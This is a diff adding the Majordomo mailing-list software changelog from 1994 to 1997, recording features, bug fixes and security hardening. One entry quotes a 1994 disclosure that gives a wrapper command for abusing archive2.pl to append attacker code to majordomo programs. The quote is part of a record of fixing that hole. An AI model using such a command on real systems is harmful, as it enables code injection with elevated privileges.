+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199703171511.JAA16200@miaow.risc.sps.mot.com>
+	
+	[ David Brownlee ]
+	
+	only check subject for admin headers if administrivia is set in list
+	config file.
+	----------------------------
+	revision 1.82
+	date: 1997/03/11 16:18:33;  author: cwilson;  state: Exp;  lines: +2 -12
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199701012129.PAA19165@miaow.risc.sps.mot.com>
+	
+	o This patch removes the misfeature in resend that looks for an absolute
+	  path in the approve_passwd or -a string to use as a file containing the
+	  actual password. Such a pathname is a security risk, can't be managed
+	  remotely, and, if set to the list.passwd file, is a security trap for
+	  the naive.
+	----------------------------
+	revision 1.81
+	date: 1997/03/10 16:22:47;  author: cwilson;  state: Exp;  lines: +15 -40
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199702261532.JAA13946@miaow.risc.sps.mot.com>
+	
+	o  If the list is moderated, don't immediately complain about an
+	   invalid approved header.
+	
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199702121912.NAA18025@miaow.risc.sps.mot.com>
+	
+	o  make sure there's a newline after message_headers and
+	   message_footers.
+	
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199701091841.MAA20902@miaow.risc.sps.mot.com>
+	
+	o  fix up restrict_post code.
+	----------------------------
+sample.cf	1.28:1.33
+	revision 1.33
+	date: 1997/04/27 14:56:45;  author: cwilson;  state: Exp;  lines: +10 -1
+	From: Earle Ake <earle.ake@hcst.com>
+	Message-Id: <199704211308.JAA15364@hcst.net>
+	
+	o  commentary for x400 stuff.
+	----------------------------
+	revision 1.32
+	date: 1997/04/07 18:57:43;  author: cwilson;  state: Exp;  lines: +2 -1
+	From: Thomas Ritter <rt@eze22.siemens.co.at>
+	Message-ID: <01BC4032.AB7CB330@eze22rt.pn5.erd.siemens.at>
+	
+	o  added /^subject:\s*Autoreply/i to global_taboo_headers.
+	----------------------------
+	revision 1.31
+	date: 1997/04/02 10:33:13;  author: cwilson;  state: Exp;  lines: +4 -2
+	o  Added 'cancel' to admin_headers and admin_body
+	o  added listproc to majordomo_dont_reply.
+	----------------------------
+	revision 1.30
+	date: 1997/03/11 10:19:46;  author: cwilson;  state: Exp;  lines: +3 -3
+	o  remove globs from uptime check.
+	----------------------------
+	revision 1.29
+	date: 1997/03/10 16:23:03;  author: cwilson;  state: Exp;  lines: +2 -2
+	fix variable typo.
+	----------------------------
+shlock.pl	1.11:1.13
+	revision 1.13
+	date: 1997/03/10 17:01:15;  author: cwilson;  state: Exp;  lines: +4 -4
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	
+	o  more tidying.
+	----------------------------
+	revision 1.12
+	date: 1997/03/10 16:25:23;  author: cwilson;  state: Exp;  lines: +13 -10
+	From: Dave Wolfe <dwolfe@risc.sps.mot.com>
+	Message-Id: <199612311338.HAA10833@miaow.risc.sps.mot.com>
+	
+	o more shlock tweaking.
+	----------------------------
+
+* Changelog: release of majordomo version 1.94
+
+	Big New Features in 1.94, or 3 tasty reasons to upgrade:
+
+	++ From: Brent Chapman <brent@greatcircle.com>
+	++  The "spam patch #1"
+	++  taboo_headers and taboo_body that catch and forward to the
+	++  approval address anything that matches their regexps.
+
+	++ From: Joe Pruett <joey@teleport.com>
+	++  The "spam patch #2"
+	++  subscribe_policy = [open|auto|closed][+confirm]
+	++  This implements a subscription policy that sends a confirmation
+	++  number back to the subscriber, to which they have to resend
+	++  to actually subscribe to the list.
+
+	++ The start of Access Control:  Avoid the Spam.
+	++  who, which, get, index, info, and intro all have
+	++  _access per-list variables that can be set to one of
+	++  [open|list|closed] to allow access to anyone, list members,
+	++  or nobody, respectively.   Naturally, any restrictions
+	++  can be overridden by the 'approve' command.
+
+	* ALL: 
+	! Escaped all @ signs for perl5.
+	! Replaced hardcoded sendmail references with a variable.
+	! Preserves ownership and permissions of files.
+
+	* Makefile
+	! big restructuring to make it easier to configure.
+	! arch command is now defined, calls 'uname -m' or 'arch' as needed.
+
+	* test / config-test
+	+ 'test' renamed to 'config-test'.  Expanded upon by darren
+	+   stalder <torin@daft.com> and Vince Skahan <vince@atc.boeing.com>
+
+	* digest:
+	+ From: pdc@lunch.engr.sgi.com (Paul Close)
+	+ Basically, these diffs add the ability to send a digest based on time or
+	+ number of lines, in addition to the usual byte count.  I've changed the
+	+ options as follows:
+	+
+	+    -r same as always.
+	+    -R receive, but don't make a digest, which allows batching.  See -p
+	+       to make a digest (or the make digest command).
+	+    -p make a digest, but only if one should be sent.  A crontab job would
+	+       run this once a day to implement the time limit.
+	
+
+	* majordomo:
+	+ Catches attempts to subscribe the list to itself.
+	+ Won't treat lines beginning with "-" as END if the header 
+	+   "Content-type" is found.  This allows MIME messages through 
+	+   unscathed.
+	+ New command: intro and newintro.  These commands are used to
+	+   retrieve the introduction file that is only sent to new 
+	+   subscribers.  This is different than the 'info' file, which 
+	+   (potentially) anyone can see.
+  	+ New command: cancel, which is an alias for unsubscribe.
+	+ X400 code checks for c= and a[dmd]= parts.
+	+ Added max_which_hits to limit 'which' output.
+	! Clarified help text
+	! Calls open_temp for temp files
+	! Sends the welcome message to the stripped address if strip is set.
+	+ Expanded command 'unsubscribe *' 
+	! Fixes the "zero-length subscriber file" bug: checks the return
+	!    code on every print, open, and closeout.
+	! Stricter check for the end of the header.
+	! $cookie_seed defaults to $homedir.
+
+	* majordomo.pl:
+	! &abort now exits with EX_DATAERR which should avoid sendmail sending bounces.
+	! Added a 'bitch' routine which bitches about things to the majordomo owner.
+	! Fixed valid_addr to better check for domain style addrs.
+	! Calls open_temp for temp files
+	! Fixed addr_match to check for a @ in unsubscribe code 
+	!   (to allow 'unsubscribe alt.sys.something', for example)
+	! Abort now sends mail if the permissions are set wrong, instead of looping endlessly.
+	- main'open_temp is now in shlock.pl
+
+	* shlock.pl:
+	! From: Bill Houle <Bill.Houle@SanDiegoCA.NCR.COM>
+	! Chan- here is a replacement version of "shlock.pl" to replace the combined
+	! code in majordomo.pl and shlock.pl. There may be some minor code fixes, but
+	! most importantly, it consolidates from the two files. This makes "shlock" a
+	! standalone package usable in other utilities.
+	+ $shlock'retries is setable.
+	+ retry sleep is 1-10 secs, random.
+
+	* resend:
+	+ Largely rewritten to make it easier to comprehend.
+	+ Extracted the header length restrictions, now defined in the .cf file. 
+	+ Now has global_taboo_headers, which means that the administravia
+	+   checks are now easily configurable.
+	! Added more checks for mailer messages.
+	! Adds the blank line between the header and body.
+	+ Mungedomain is heeded by resend for posting to a closed list.
+	+ Additionally checks the reply-to field for posting approval 
+	+ Added taboo_headers and taboo_body checks.
+
+	* approve:
+	! Fixed 'can't find passwd' bit.
+
+	* config-parse.pl:
+	+ writeconfig checks that the new config is written out
+	+  safely.
+	! &grab_restrict_post only adds $listdir if needed.
+	! Changed writeconfig to write shorter lines.
+	! Aborts instead of dies (political statement?)
+	+ Added taboo_* stuff, private_intro.
+
+	* archive2.pl:
+	! chdir $HOME.
+	! removes Approved header.
+	
+	* wrapper.c: 
+	! setgroups can return non-zero, checked for that.
+	
+	* bounce:
+	+ Took pdc@sgi.com's version, which...
+	+   1. If you use -expire and give it a list of bounces entries (from who
+	+   or just the list) it will issue unsubscribes for all the entries older
+	+   than a certain date.
+	+   
+	+   2. If you use -unsub (or if the program name contains unsub), bounce
+	+   will unsubscribe the user from the list, but not add them to bounces.
+	+   This is good for handling people who request to be unsubscribed, but can't
+	+   figure out how to do it themselves.  I suggest linking bounces to unsub.
+	+   This is handier than it might sound :-)
+
+	* sample.cf
+	+ Updated for global_taboo_headers.
+	+ Updated for &abort error codes.
+
+	* FAQ
+	! latest version from rtfm.mit.edu
+
+	* misc
+	+ From: "John C. Orthoefer" <jco@direwolf.com>
+	+  A cgi-bin script that presents a simple 
+  	+  subscribe, unsubscribe, who, and info command via the web.  
+ 	+  It's in the contrib/md-sub directory.
+
+	+ From: Lindsay Haisley <fmouse@fmp.com>
+	+  The following is a short program I cobbled together to adjust digest volume
+	+  and issue numbers in config files.  The program should be run from the md
+	+  wrapper to provide an appropriate environment.  I will be running it
+	+  indirectly out of a cron job on the first of every month so that my volume
+	+  and issue numbers on a daily-generated digest will reflect the month and
+	+  day-of-month.
+
+	+ From: shane@themacs.com (Shane P. McCarron)
+	+  Program for adding sequence numbers to subject lines.
+
+Tue Jan  10 18:33:22 1995  John P. Rouillard  (rouilj@dstar.iddis.com)
+
+	* Changelog: release of majordomo version 1.93
+
+Sat Jan  7 17:35:18 1995  John P. Rouillard  (rouilj@dstar.iddis.com)
+ 
+        * FAQ: Added new faq that is updated for 1.93 release.
+ 
+        * sample.cf:
+        Added variables that control X.400 address analysis attempts. Turned
+        off by default.
+ 
+        * majordomo.pl:
+        Added better do_exec_sendmail that doesn't append the nul arg to
+        sendmail) which some sendmail lookalikes barf on).  I also added the
+        code that attempts to handle X.400 addresses in a safe way. By default
+        it isn't enabled. There is a varible that has to be set before it
+        becomes active.
+ 
+        * resend, new-list:
+        removed main'do_exec_sendmail since it is done in majordomo.pl now.
+ 
+        * config_parse.pl:
+        Fixed error message and fixed bug where I did an open_temp and
+        shouldn't have since the file was due tio be clobbered, but the file
+        was in $listdir anyway, so it shouldn't be a security problem.
+ 
+        * wrapper.c, Makefile:
+        Fixed define for using setgroups, and added appropriate parameter to
+        makefile for posix build.
+ 
+Mon Jan  2 20:15:38 1995  John P. Rouillard (rouilj@dstar.iddis.com)
+	Released majordomo 1.93beta1 for testing.
+
+
+Mon Jan  2 19:31:38 1995  John P. Rouillard (rouilj@dstar.iddis.com)
+
+	* FAQ
+	Got newest FAQ from majordomo@pop.psu.edu, and corrected mkdigest
+	usage that was stripped by the html parser.
+
+        * archive2.pl:
+        Added attribution for code, and added algorithm and labeled points in
+        the code for a writeup of my analysis.
+ 
+        * config_parse.pl:
+        Added open_temp calls to writable open files for the config and
+        newconfig file opens. In retrospect, they probably aren't necessary
+        since being able to write the $listdir is a fatal security hole
+        anyway.
+ 
+        * README:
+        Documented nature of race condition, and the assumptions that were
+        made concerning the solution to the race condition.
+ 
+        * README, Makefile, Changelog:
+        Added text for 1.93beta1 release of majordomo.
+ 
+        * Makefile: Fixed distribution target.
+ 
+        * Makefile: Install the test script by default.
+ 
+        * resend: fixed another administrivia filter
+ 
+        * Changelog: updated
+
+Mon Jan  2 00:20:12 1995  John P. Rouillard (rouilj@dstar.iddis.com)
+ 
+        * README: Added description of fixed approve bug.
+ 
+        * approve:
+        fixed bug with warn being a list argument and taking the return
+	as an arg in a , statement
+
+Sat Dec 31 23:00:29 1994  John P. Rouillard (rouilj@dstar.iddis.com)
+ 
+        * shlock.pl:
+        Added some debugging code for testing lock files, and cleaned error
+	message.
+ 
+        * archive2.pl:
+        Compared device numbers as well as inode numbers for the files, and
+        handle the case of a missing archive file properly by performing
+        symbolic link and inode/device checks after the open has suceeded if
+        the file didn't exist in the first place since the comparison is
+        actually time invarient.
+ 
+        * shlock.pl: Fixed the race condition in opening of the lock file.
+ 
+        * majordomo.pl: Check device number for file as well as inode.
+ 
+Tue Dec 27 20:43:44 1994  John P. Rouillard (rouilj@dstar.iddis.com)
+ 
+        * bounce: Globbing no longer needed.
+ 
+        * README:
+        documented fix of shell glob failure on which and lists commands.
+        remumbered fixes.
+ 
+        * bounce: replaced glob on ~ for perl5 comptibility
+ 
+        * majordomo: fixed list/which failure when globbing to many lists
+ 
+        * README: included additional info on wrapper changes
+ 
+Tue Dec 27 00:14:49 1994  John P. Rouillard (rouilj@dstar.iddis.com)
+
+	* digest, majordomo.pl:
+	Also have to check the filehandle to make sure that it doesn't have
+	more than one link to it.
+
+	* digest:
+	Wrapper opens many temporary files, so I have (hopefully) implemented
+	a more secure way of opening newly created files so that arbitary
+	files owned by majordomo can't be overwriten/appended to.
+
+Mon Dec 26 23:58:55 1994  John P. Rouillard (rouilj@dstar.iddis.com)
+
+	* archive2.pl:
+	Paul Phillips provided some code to close the following hole.
+	
+	Date:    Tue, 06 Dec 1994 01:48:46 PST
+	From:    Paul Phillips <paulp@primus.COM>
+	Subject: Serious security hole in archive2.pl
+	
+	I have found what I believe to be a very serious security hole in the
+	archive2.pl script supplied with majordomo 1.92.
+	
+	Problem: Any user on the system can append to any file writable by the
+	wrapper program.
+	
+	Explanation: The archive2.pl script takes as arguments an archive file
+	(the -f option) and a file to be appended (-a).  According to the docs,
+	the recommended permissions for the wrapper are 775, world executable,
+	which will allow a malicious user to execute
+	
+	% /usr/local/mail/majordomo-1.92/wrapper archive2.pl -f
+	some-majordomo-program -a file-with-hacker-text-to-append
+	
+	This allows him to append perl code to majordomo (for example) to be
+	later executed with wrapper permissions.
+
+	* test: A file to test for uid/gid setting under the wrapper
+
+	* Makefile:
+	Set up for posix/solaris 2.x build at IDD. Also cleaned up some bogus
+	non empty lines.
+
+	* README:
+	Added comments section at the top of the README describing the changes
+	including the license file and the fixed from 1.92.
+
+	* wrapper.c:
+	Added a cast to shut up gcc, and added a setgroups call to clobber all
+	group memberships from sendmail. This only works for POSIX where the
+	euid is root.
+
+	* sample.cf: added required @archive_dirs array.
+
+	* resend: Changed copyright notice.
+	
+	Quoted @ signs. Replaced open() class with calls to open_temp that
+	should reduce the chances of a bad person exploiting a race condition
+	between the existance test and the open.  I also changed dies to
+	aborts so people are notified, also I labeled the different abort
+	messages so that identical messages can be differentiated.
+	
+	I added better/smarter admiistrivia checks especially making a better
+	help filter.
+	
+	Fixed the unlink glob failure bug that was introduced in the 1.92 release.
+
+	* request-answer: Quoted @ signs for perl5.
+
+	* medit: Changed copyright notice.
+
+	* majordomo_version.pl:
+	Version 1.93beta1. Here's hoping we don't run out of version numbers before
+	2.0 is released.
+
+	* majordomo.pl:
+	Added the function main'open_temp which is a function that will open
+	temporary files trying to make certain that the opened file is a new
+	file and not a file that is already in existance. The only side effect
+	is that the file that is opened (by somebody attempting to fool the
+	open function) may have its atime updated.
+
+	* majordomo.cf:
+	Added @archive_dir and converted for use at dstar.iddis.com.
+
+	* majordomo:
+	Changed the copyright notice, and quoted the @ sign for perl5.
+
+	* config_parse.pl:
+	Quoted @ signs and $ signs in strings or patterns for perl5. Also
+	added the characters @ and ! as being valid for regular expressions
+	for advertize and noadvertize.
+
+	* bounce-remind: Quoted @ signs in strings for perl5.
+
+	* approve:
+	Removed ~/.majordomo glob which didn't work under perl5, and replaced
+	it with $ENV{HOME}. I also turned mail into /usr/ucb/mail so the -s
+	flag always (I hope) makes sense.
+
+	* LICENSE: the license for majordomo use
+
+Thu June 6 15:50:23 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+        * 
+	Updated files to report version 1.92 release
+	*
+	Added code to handle two types of Security problems caused by 
+	using putting from line. Sendmail is now invoked using -t flag
+	when to address is derived from the From line. Sendmaiil is
+	exec'ed after perl forks rather than opening directly with
+     	open, from lines with a - sign at the front of the address are
+     	bounced as hostile addresses.
+
+Mon May  9 17:16:52 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* ALL
+	released version 1.90 of majordomo
+
+	* Makefile:
+	added -f to rm so it always completes sucessfully for the distclean
+	target.
+
+	* README:
+	Added comments about the list membership advertize feature that always
+	lists any list you are subscribed to.
+
+	* Makefile:
+	added specific archive install targets, added distribution target, moved all install targets together
+
+	* digest: Added code to smash list name tolowercase.
+
+Sun May  8 22:28:49 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* README:
+	Added comments about making sure that digest has its archive and
+	incoming directories created
+
+	* majordomo:
+	Set up help function to use $majordomo_receive to properly tailor the
+	help message.
+
+	* sample.cf:
+	documented that majordomo_receive is also used to determine the help
+	text that is sent.
+
+	* sample.aliases: Lowercased Sample list for -l flag to resend
+
+	* README:
+	Documented need for /etc/majordomo.cf so that medit will work.
+	Documented that the value for the -l flag to resend should be all
+	lower case.
+
+	* resend:
+	Added code to smash case of list name specified with -l option since
+	$opt_l was passed off directly to config_parse.pl, and majordomo
+	always smashed case on lists when creating them.
+
+	* medit: Changed default majordomo.cf location to /etc/majordomo.cf
+
+	* README:
+	Fixed some typos and expanded on perl version information, and made
+	some constructs parallel. Updated thanks list to include Jerry Peek.
+
+Sun May  8 02:32:59 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* config_parse.pl:
+	Fixed up a bit more debugging cruft to stdout. Now it check the debug
+	flag before printing errors.
+
+	* digest: Fixed bug in file limiting code.
+
+Sat May  7 22:09:17 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* majordomo:
+	Changed we're to we are to get around bug in emacs perl mode.
+	
+	Also changed all occurances of:
+	     if ( (!$list) || ! ($clean_list = &valid_list($listdir, $list))) {
+	to
+	     if ( ((!$list) || ! ($clean_list = &valid_list($listdir, $list)))
+		&& defined($deflist)) {
+	
+	This makes error work properly when a request like:
+	
+		subscribe rouilj@cs.umb.edu
+	
+	is made to a majordomo running without the -l flag.
+	
+	Also any error in newinfo or in newconfig causes all text to be eaten
+	up to the trailing EOF statement so that here text isn't accidnetly
+	executed.
+
+	* digest:
+	Added code to only include files with the name [0-9]* in a digest.
+	It warns if there are files that aren't supposed to be in the
+	incomming directory.
+
+	* config_parse.pl:
+	made grab_absolute_file and grab_absolute_dir to be no ops.
+
+	* README: Removed section on global indexing of majordomo
+
+	* config_parse.pl: fixed formatting
+
+	* majordomo.cf: Fixed comment formatting.
+
+	* Makefile:
+	Removed unused install target. Added explicit shell setting. Split
+	install-scripts into install-scripts and install-cf. Install-cf
+	installs ./majordomo.cf or ./sample.cf if majordomo.cf doesn't exist
+	as the $W_BIN/majordomo.cf. Added dist-clean target for use by cvs to
+	clean up stuff when checking out majordomo-dist.
+
+	* sample.cf: updated to match current majordomo.cf
+
+	* config_parse.pl:
+	Added debug print supression to making defaults announcement.
+
+Fri May  6 22:04:19 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* FAQ: Deleted old comment according to David Barr's request.
+
+	* FAQ: Updated FAQ from Dave Barr.
+
+	* README:
+	Updated version statement in the README. It is now the readme for
+	1.90. Added tricks section. Updated FAQ notes.
+
+	* README:
+	Added comments about the 1.90 cognizant version of the majordomo
+	chapter being done and becoming available via ftp in due time.
+
+	* resend:
+	Fixed bug that prevented addministrivia checks from functioning. Hey
+	lets hear it for regression suites. If I'd let this one slip out
+	again, I would never have heard the end of it.
+
+	* README: Added info blurb about gloal indexing
+
+Fri May  6 18:23:48 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* majordomo_version.pl:
+	Upgraded version identfier from 1.90b2 to 1.90. I won't miss this
+	again 8-).
+
+	* majordomo.cf, majordomo:
+	The -l flag enhancements weren't quite right. There was no variable
+	that could be used to turn off the unsubscription information for
+	using the -request address. The majordomo config file majordomo.cf now
+	sports a majordomo_request variable that will enable the -request help
+	messages. By default the variable's value is 0 which supresses the
+	help message.
+
+	* config_parse.pl: changed debug value to 0.
+
+Thu May  5 20:28:54 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* Description:
+	Changed all references to "I" into Brent Chapman, or Brent.
+
+Tue May  3 22:22:03 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* resend, README:
+	Added RCPT: filter to resend, and updated the bugs page
+	that the rcpt shouldn't be an administrivia bounce, and
+	the expressions that get filtered should be settable by the
+	list admin.
+
+Mon May  2 22:02:57 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* mod_addr.diff:
+	Arnold de Leon's patches for specifying a seperate moderator
+	for bounced email from resend.
+
+	* README:
+	Added Arnold de Leon's patches for specifying a seperate moderator
+	for bounced email from resend.
+	
+	Added a bugs/todo/misfeatures section.
+
+	* majordomo.man, majordomo.8:
+	Mentioned list descriptions returned by the lists command.
+	Mentioned using \ at the end of lines to continue a line.
+
+	* README:
+	Added comments about list-managers and that majordomo operation
+	questions are not appropriate for that list.
+
+	* new-list: Fixed assignment so it is a scalar assignment.
+
+	* resend: Added code to eliminate help admistrivia
+
+Thu Apr 28 16:36:04 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* README: Added error description for "unknown mailer error 5".
+
+Wed Apr 27 19:17:04 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* majordomo:
+	tail anchored the regexp. This should make it a bit faster to apply.
+
+	* majordomo:
+	Added test to make sure that shell expansion suceeded before
+	doing unlink.
+
+Tue Apr 26 22:02:09 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* README:
+	Changed format of list names so that only lowercase letters
+	are allowed.
+
+	* README:
+	Fixed fome paragraph formatting. added some aditonal comments about
+	the stuff in config. added a new section about majordomo error
+	messages.
+
+Fri Apr 22 19:20:14 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* digest.diff: Adds functions to digest.
+
+	* makeindex.pl: Made commentary change as Paul Close requested
+
+	* logsummary.pl:
+	Fixed syntax problem for 4.019 perl, and made the script ignore blank
+	lines in its input.
+
+	* makeindex.pl: Fixed syntax problem for 4.019 perl.
+
+	* makeindex.pl, logsummary.pl:
+	some neat program from Paul close inital checkin.
+
+	* resend:
+	Made Getopts failure message say that getopts failed but the error
+	produced is still cryptic. It doesn't look like getopts returns a real
+	error for a missing required argument..
+
+Thu Apr 21 16:56:57 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* README: Documentation changes to make thing clearer.
+
+	* config_parse.pl:
+	Changed description for subscription_policy. auto is now described
+	after open to point out the differences a little better.
+
+Wed Apr 20 23:19:42 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* digest: Fixed typo that affected the name of the archive dir.
+
+	* majordomo.cf:
+	Added comments stating that @safedirs is essentially a no op.
+
+	* majordomo:
+	Commented out setting of PATH in majordomo since the wraper does it
+	already, and the wrapper is easily customizable in the makefile.
+
+	* README:
+	Changed location of text that discussed the -l option to majordomo.
+	Added comment about moving archive2.pl from its install area in Tools
+	to the top level majordomo directory if you want to use it.
+
+Sun Apr 17 20:07:00 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* resend:
+	Fixed a bug when moderated and restricted posting (-I) options are
+	used together. I moved the code that bounces non-approved submissions
+	to moderated lists after the code that checks to see if the persion is
+	allowed to send email. Now if a message comes in to a -I/-A list, it
+	will be checked to see if the person is on the approved posting list.
+	If not, then the message will be bounced with "Non member submission".
+	If the person is allowed to submit, but they didn't provide the
+	approval password, the you get an "Approval Required" message.
+
+Thu Apr 14 06:49:10 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* resend:
+	Added code that checks to see that we have at least one outgoing
+	address	to send to.
+
+Fri Apr  8 22:13:46 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* majordomo.ora, README: added O'reilly chapter on majordomo
+
+	* Description:
+	updated Description with new 1.90 commands for config file and digest
+
+Sun Apr  3 22:49:59 1994  John P. Rouillard  (rouilj@cs.umb.edu)
+
+	* FAQ: first FAQ installement
+
+	* majordomo_version.pl: updated version info to 1.90b2
+
+	* Rereleased version 1.90b2 with updated internal version
+	  info.
+
+Sat Apr  2 22:36:32 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+	* Release of 1.90 beta 2
+
+Sat Apr  2 22:34:32 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* sample.aliases: Added Paul Pomes aliases.
+
+	* README:
+	Said README was for 1.90 beta 2.  Added questions from majordomo-users
+	mailing list. Made note that FAQ is still under development. Added doc
+	about other README's. Added Paul Pomes sample init code for message
+	fronter and footers.
+
+	* config_parse.pl: Added default value for message length at 40000.
+
+Mon Mar 14 18:40:25 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* config_parse.pl, README:
+	Fixed typos that Brent Chapman sent me with the README file. I fixed
+	the corresponding spelling mistakes in the config_parse.pl file so
+	that the mistakes aren't propigated into the config files.
+
+	* resend, approve:
+	Added patches from Brent Chapman for bug fixes to 1.62 that I had not
+	integrated.
+	
+	(Brent) I pulled over 1.90b1 and integrated the changes I'd made to
+	Majordomo since 1.62 that you hadn't already made.  Basicly, there
+	were 3 minor bug fixes:
+	
+	Fixed a minor bug in "approve": it was using the "mail" program
+	in some places
+	and the "Mail" program in others, but now consistently uses "mail".
+	
+	Fixed a minor bug in "resend" that was causing it to try and validate
+	"Approved:" headers anywhere in the body of a message, instead of just
+	in the first line of the body, if the "-M" argument was not set.
+	
+	Fixed handling of "-I" argument to "resend", so that it would squawk
+	if a "-I" argument file couldn't be found, and so that $listdir is prepended
+	to the arguments only if they aren't already absolute path names (i.e.,
+	only if they don't already begin with "/").
+	
+	Here are diffs for "approve" and "resend".  I have NOT tested these
+	yet, but the patches were pretty simple so they'll probably be OK.
+
+	* README: changed install directions to confiorm to makefile changes
+
+	* Makefile:
+	fixed filename references and reduced amount of root installion requirement
+
+	* wrapper.sh: fixed varible refernce
+
+	* majordomo.cf:
+	Added code to use the HOME environment variable defined by the wrapper
+	to set $homedir.
+
+Mon Mar  7 20:57:12 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* README: ran though ispell
+
+	* majordomo_version.pl: updated version string
+
+	* sample.cf, majordomo.cf, README, Makefile:
+	documentation updated to 1.90
+
+Sun Mar  6 22:43:36 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* resend, majordomo, config_parse.pl, Makefile:
+	Obsoleted split_archive.pl in favor of brent's archive2.pl program.
+	
+	Makefile:
+	  modified to use contrib directory to copy archive2.pl from. Also
+	  digest/digest is copied into place in install-scripts.
+	
+	config_parse.pl:
+	   changed sender default value to be owner-listname from
+		 listname-Owner.
+	   readded archive_dir
+	   reply-to default changed to strip -digest from listname
+	   added digest specific keywords
+	
+	 	'digest_volume'	'digest_issue'	'digest_work_dir' 'digest_name'
+		'digest_archive' 'digest_rm_footer' 'digest_rm_fronter'
+	
+	   All comments have removed references to command line flags.
+		to make this true, the command line flags will have
+		to be removed, but that will be the case for new installations.
+	
+	   subject_prefix commeent talks about duplicate supression.
+	
+	   changed &mk_default_config to &writeconfig
+		increased size of key in comments section
+	
+	   fixed bug in '-' escape handling that resulted in incorrect reverse
+		escaping.
+	
+	   grab_absolute_dir now uses key in error messages. Empty directory no
+		longer an error.
+	
+	majordomo:
+	
+		$main'main_program is set to mj_majordomo
+	
+		add some sanity checking for majordomo.cf file.
+	
+		added mkdigest command to drive digest creation
+	
+		fixed bug with mungdomain enabled that causes a match to occur
+		for an address when subscribing, but not for unsubscribing.
+	
+		fixed format of some help messages to allow them to stay less
+		 than 80 characters per line.
+	
+	resend:
+	
+		set $main'main_program to mj_resend
+
+Mon Feb 21 18:27:35 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* majordomo.cf, config_parse.pl:
+	Made digest part of the config file code enhancements.
+
+	* majordomo:
+	removed #dashl comments since the -l code seems to work properly. also
+	added $main'main_program variable.
+
+	* resend: Added $main'main_program variable.
+
+Sun Feb 20 05:32:18 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* majordomo:
+	Merged in changes to support a -l argument to majordomo from R. Gary
+	Cutbill rgary@x.org. If majordomo is run at the request address with
+	the -l <listname> argument, then the list name is optional in
+	majordomo commands.
+
+Fri Feb 18 04:58:42 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* resend:
+	Fixed bug that resulted in subject tag not being applied where it
+	should have been because the regular expression that eliminates
+	subject tag application if the tag already exists didn't have its non
+	alphanumeric characters escaped resulting in misinterpreted regular
+	expressions.
+
+Thu Feb 17 20:02:32 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* wrapper.sh: added support for apollo DomainOs to the wrapper.
+
+Wed Feb  9 20:12:20 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* resend:
+	Added check so that the subject_prefix is put onto the front of the
+	subject line if and only if it hasn't been found in the subject line
+	already. This should prevent subject lines like:
+	
+		Subject: [list] Re: [list] foo bar baz
+	
+	This also enables preservation of Re: by mailers so that they don't
+	add more stupid Re:'s at the beginning of the subject.
+
+Tue Feb  8 00:11:53 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* Changelog: fixed line breaks
+
+	* config_parse.pl:
+	added to man page, and moved known_keys nearer to top of file
+
+Mon Feb 7 22:51:04 1993  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+	* RELEASE OF 1.62 CONFIG BETA 3
+
+Mon Feb  7 20:37:32 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* majordomo.pl, majordomo:
+	Added code to allow "\ " to escape a space in the majordomo command
+	line. Also added " " as a valid character in the filename.
+
+Sun Jan 30 04:31:00 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* resend:
+	Added & to sendmail command that calls the actual list distribution
+	address. This should help to alleviate some of the memory thrashing
+	that goes on with resend by colapsing the sendmail -> resend ->
+	sendmail to the final sendmail since the first sensmail, and the
+	resend will exit.
+
+Fri Jan 28 15:48:02 1994  John P. Rouillard  (rouilj@terminus.cs.umb.edu)
+
+	* majordomo:
+	added code so that a list is displayed if the person is on it
+
+	* majordomo: increased width of description to 56
+
+	* majordomo: decreased list output indentation to 2 spaces
+
+	* majordomo:
+	fixed width of description at 55 characters to prevent lines > 80 characters in list output
+
+	* majordomo, config_parse.pl:
+	Added code that changes the sender of the welcome message generated in
+	response to a subscribe command to be the sender of the list that is
+	subscribed to. This will do some nice things like alerting the list
+	manager to bogus addresses on the list. It will also supress the
+	annoying message that I get when I subscribe somebody to the bounces
+	mailing list. I know that the address I put on bounces is
+	undeliverable, why do you think I put it on bounces 8-).
+
+	* majordomo:
+	first cut at geting bounced welcome messages to go to the list owner rather than
+	 majordomo-owner
+
